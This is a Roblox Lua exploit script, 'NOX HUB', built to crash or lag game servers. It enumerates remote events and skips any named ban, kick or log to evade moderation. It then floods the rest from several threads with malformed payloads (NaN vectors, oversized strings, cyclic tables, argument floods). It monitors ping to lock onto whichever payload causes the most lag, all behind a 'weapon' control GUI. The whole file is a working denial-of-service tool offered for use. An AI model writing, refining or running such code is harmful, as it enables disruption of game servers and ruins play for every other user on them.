--[[
    🔱 NOX HUB v23.0 [ADAPTIVE-WARFARE] 🔱
    "If one door is locked, try the window. If the window is locked, try the chimney."
    
    ADAPTIVE FEATURES:
    - [MULTI-AMMO] : Cycles through 4 distinct crash types (Vectors, Strings, Cycles, Args).
    - [PING-WATCH] : Monitors Server Ping. If it spikes, LOCKS the current ammo.
    - [AUTO-SWITCH] : If Ping is stable (Server resisting), Automatically switches to next ammo.
    - [SURGICAL] : Finds exactly WHAT crashes this specific game.
]]

-- // CORE SERVICES //
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local Stats = game:GetService("Stats")
local LocalPlayer = Players.LocalPlayer

-- // 1. ADAPTIVE ENGINE //
local Engine = {
    Active = false,
    Targets = {},
    CurrentMode = 1,
    BestMode = nil,
    PingHistory = {}
}

-- THE ARMORY
local Amnunition = {
    [1] = {Name = "VOID VECTORS (NaN)", Load = function() return table.create(100, Vector3.new(0/0,0/0,0/0)) end},
    [2] = {Name = "MASSIVE STRINGS", Load = function() return table.create(20, string.rep("💀", 1000)) end},
    [3] = {Name = "CYCLIC TABLES", Load = function() local t = {}; t[1] = t; return table.create(50, t) end},
    [4] = {Name = "ARGUMENT FLOOD", Load = function() return "ARGS" end} -- Special Handling
}

function Engine:Scan()
    Engine.Targets = {}
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
            -- Strict Filter again to avoid instant kick
            local n = v.Name:lower()
            if not (n:find("ban") or n:find("kick") or n:find("log")) then
                 table.insert(Engine.Targets, v)
            end
        end
    end
end

function Engine:GetPing()
    -- Heuristic for Ping (NetworkClient is restricted usually, so we assume from FPS/Replication)
    -- Actually, Stats.Network.ServerStatsItem["Data Ping"]:GetValue() works in some exploit envs
    -- We'll use a simple approximation: Time differnce of a remote function loop (if available) or Stats
    return Stats.Network.ServerStatsItem["Data Ping"]:GetValue()
end

function Engine:Engage(updateCallback)
    if Engine.Active then return end
    Engine.Active = true
    
    Engine:Scan()
    if #Engine.Targets == 0 then return end
    
    task.spawn(function()
        local ModeTimer = 0
        local StartPing = Engine:GetPing()
        
        while Engine.Active do
            -- 1. SELECT AMMO
            local ModeData = Amnunition[Engine.BestMode or Engine.CurrentMode]
            local Payload = ModeData.Load()
            
            updateCallback(ModeData.Name, Engine:GetPing())
            
            -- 2. FIRE BURST (50ms)
            local burstStart = tick()
            for i = 1, 5 do -- 5 threads
                task.spawn(function()
                    for _, t in ipairs(Engine.Targets) do
                        pcall(function()
                            if ModeData.Name == "ARGUMENT FLOOD" then
                                -- Arg flood needs special call: Fire(1, 2, 3...)
                                if t:IsA("RemoteEvent") then t:FireServer(unpack(table.create(50, "A"))) end
                            else
                                if t:IsA("RemoteEvent") then t:FireServer(Payload)
                                else t:InvokeServer(Payload) end
                            end
                        end)
                    end
                end)
            end
            task.wait(0.1) -- Wait for impact
            
            -- 3. ANALYZE IMPACT
            local CurrentPing = Engine:GetPing()
            
            -- Logic: If Ping > 300ms, WE FOUND A WEAKNESS. KEEP FIRING.
            if CurrentPing > 300 then
                Engine.BestMode = Engine.CurrentMode -- Lock this mode
            elseif not Engine.BestMode then
                -- Rotate Mode every 2 seconds if no lag detected
                ModeTimer = ModeTimer + 0.1
                if ModeTimer > 2 then
                    Engine.CurrentMode = (Engine.CurrentMode % #Amnunition) + 1
                    ModeTimer = 0
                end
            end
            
            RunService.Heartbeat:Wait()
        end
        updateCallback("STOPPED", 0)
    end)
end

function Engine:Stop()
    Engine.Active = false
    Engine.BestMode = nil
end

-- // 2. ADAPTIVE UI //
local Nox = {}

function Nox:CreateUI()
    for _, v in pairs(CoreGui:GetChildren()) do if v.Name:find("Nox") then v:Destroy() end end
    
    local Screen = Instance.new("ScreenGui")
    Screen.Name = "NoxAdaptive"
    pcall(function() Screen.Parent = CoreGui end)
    
    local Main = Instance.new("Frame", Screen)
    Main.Size = UDim2.new(0, 400, 0, 300)
    Main.Position = UDim2.new(0.5, -200, 0.5, -150)
    Main.BackgroundColor3 = Color3.fromRGB(20, 25, 20) -- Military Green/Dark
    Main.BorderSizePixel = 2
    Main.BorderColor3 = Color3.fromRGB(50, 200, 50)
    
    -- RADAR EFFECT
    local Radar = Instance.new("ImageLabel", Main)
    Radar.Size = UDim2.new(0, 200, 0, 200)
    Radar.Position = UDim2.new(0.5, -100, 0.2, 0)
    Radar.Image = "rbxassetid://3570695787" -- Circle
    Radar.ImageColor3 = Color3.fromRGB(0, 50, 0)
    Radar.BackgroundTransparency = 1
    
    local ScanLine = Instance.new("Frame", Radar)
    ScanLine.Size = UDim2.new(0.5, 0, 0.02, 0)
    ScanLine.Position = UDim2.new(0.5, 0, 0.5, 0)
    ScanLine.BackgroundColor3 = Color3.fromRGB(50, 255, 50)
    ScanLine.BorderSizePixel = 0
    ScanLine.Style = Enum.FrameStyle.ChatGreen
    
    -- STATS
    local WeaponLbl = Instance.new("TextLabel", Main)
    WeaponLbl.Text = "WEAPON: IDLE"
    WeaponLbl.Size = UDim2.new(1, 0, 0, 30)
    WeaponLbl.Position = UDim2.new(0, 0, 0.65, 0)
    WeaponLbl.TextColor3 = Color3.fromRGB(150, 200, 150)
    WeaponLbl.Font = Enum.Font.Code
    WeaponLbl.BackgroundTransparency = 1
    
    local PingLbl = Instance.new("TextLabel", Main)
    PingLbl.Text = "PING: 0ms"
    PingLbl.Size = UDim2.new(1, 0, 0, 30)
    PingLbl.Position = UDim2.new(0, 0, 0.75, 0)
    PingLbl.TextColor3 = Color3.fromRGB(200, 200, 200)
    PingLbl.Font = Enum.Font.GothamBold
    PingLbl.BackgroundTransparency = 1
    
    -- ANIMATION LOOP
    task.spawn(function()
        local r = 0
        while Main.Parent do
            r = r + 5
            ScanLine.Rotation = r
            ScanLine.Position = UDim2.new(0.5, 0, 0.5, 0) -- Pivot is messy in basic frames, visual only
            
            -- Actually rotatable logic requires AnchorPoint
            ScanLine.AnchorPoint = Vector2.new(0, 0.5)
            
            wait(0.05)
        end
    end)
    
    -- BUTTON
    local Btn = Instance.new("TextButton", Main)
    Btn.Size = UDim2.new(0.8, 0, 0.2, 0)
    Btn.Position = UDim2.new(0.1, 0, 0.82, 0)
    Btn.BackgroundColor3 = Color3.fromRGB(30, 80, 30)
    Btn.Text = "ENGAGE ADAPTIVE SYSTEM"
    Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    Btn.Font = Enum.Font.GothamBlack
    Btn.TextSize = 16
    
    Btn.MouseButton1Click:Connect(function()
        if not Engine.Active then
            Engine:Engage(function(mode, ping)
                WeaponLbl.Text = "WEAPON: " .. mode
                PingLbl.Text = "PING: " .. math.floor(ping) .. "ms"
                
                if ping > 300 then
                    PingLbl.TextColor3 = Color3.fromRGB(255, 0, 0)
                    WeaponLbl.TextColor3 = Color3.fromRGB(255, 50, 0)
                else
                    PingLbl.TextColor3 = Color3.fromRGB(200, 200, 200)
                    WeaponLbl.TextColor3 = Color3.fromRGB(150, 200, 150)
                end
            end)
            Btn.Text = "CEASE FIRE"
            Btn.BackgroundColor3 = Color3.fromRGB(100, 30, 30)
        else
            Engine:Stop()
            Btn.Text = "ENGAGE ADAPTIVE SYSTEM"
            Btn.BackgroundColor3 = Color3.fromRGB(30, 80, 30)
            WeaponLbl.Text = "WEAPON: IDLE"
        end
    end)
    
    -- DRAG UI
    local dragging, dragInput, dragStart, startPos
    Main.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true; dragStart = input.Position; startPos = Main.Position
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement and dragging then
            local delta = input.Position - dragStart
            Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
    UserInputService.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end end)
end

Nox:CreateUI()
